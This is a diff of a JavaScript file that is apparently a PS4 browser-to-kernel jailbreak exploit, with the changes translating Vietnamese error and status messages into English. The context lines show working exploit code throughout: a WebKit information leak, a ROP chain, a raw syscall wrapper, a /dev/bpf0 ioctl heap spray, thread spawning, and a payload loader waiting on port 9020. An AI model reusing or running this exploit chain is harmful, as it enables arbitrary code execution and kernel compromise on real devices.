@@ -215,7 +215,7 @@ while (foundLeak == undefined && maxCount > 0) {
    }
 }
 if (!foundLeak) {
-   throw new Error("thông tin thất bại");
+   throw new Error("infoleak fail");
 }
 Array.prototype.__defineGetter__(100, () => 1);
 var firstLeak = Array.prototype.slice.call(foundLeak, foundIndex, foundIndex + 64);
@@ -433,7 +433,7 @@ var exploit = function() {
       chain.push(g.pop_rax);
       chain.push(p.leakval(1094795842));
       if (chain.run().low != 1094795842) {
-         throw new Error("hành vi rop bất ngờ");
+         throw new Error("unexpected rop behaviour");
       }
       returnvalue = p.read8(chain.stackBase.add32(16376));
    };
@@ -454,11 +454,11 @@ var exploit = function() {
    };
    p.syscall = function(sysc, rdi, rsi, rdx, rcx, r8, r9) {
       if (typeof sysc != "number") {
-         throw new Error("cuộc gọi tòa nhà không hợp lệ");
+         throw new Error("invalid syscall");
       }
       var off = s[sysc];
       if (off == undefined) {
-         throw new Error("cuộc gọi tòa nhà không hợp lệ");
+         throw new Error("invalid syscall");
       }
       return p.fcall(off, rdi, rsi, rdx, rcx, r8, r9);
    };
@@ -497,7 +497,7 @@ var exploit = function() {
       var fd = p.syscall(5, p.sptr("/dev/bpf0"), 2).low;
       var fd1 = p.syscall(5, p.sptr("/dev/bpf0"), 2).low;
       if (fd == (-1 >>> 0)) {
-         throw new Error("mở bpf thất bại");
+         throw new Error("open bpf fail");
       }
       var bpf_valid = p.malloc32(16384);
       var bpf_spray = p.malloc32(16384);
@@ -514,7 +514,7 @@ var exploit = function() {
       }
       var rtv = p.syscall(54, fd, 2148549243, bpf_valid_prog);
       if (rtv.low != 0) {
-         throw new Error("ioctl bpf thất bại");
+         throw new Error("ioctl bpf fail");
       }
       var spawnthread = function(name, chain) {
          var longjmp = webKitBase.add32(5352);
@@ -794,8 +794,8 @@ var exploit = function() {
       }
    }
    p.fcall(createThread, shellbuf, 0, p.stringify(name));
-   alert("Đang chờ tải trọng... Gửi nó bằng IP PS4 và cổng 9020");
-   msgs2.innerHTML="<h1 style="font-size:30px;">Trình tải thùng đã ra mắt ✔</h1>";
+   alert("Waiting for Payload... Send it using the PS4 IP and port 9020");
+   msgs2.innerHTML="<h1 style='font-size:30px;'>Bin Loader Launched ✔</h1>";
 };
 window.onload = function() {
    setTimeout(exploit, 1000);
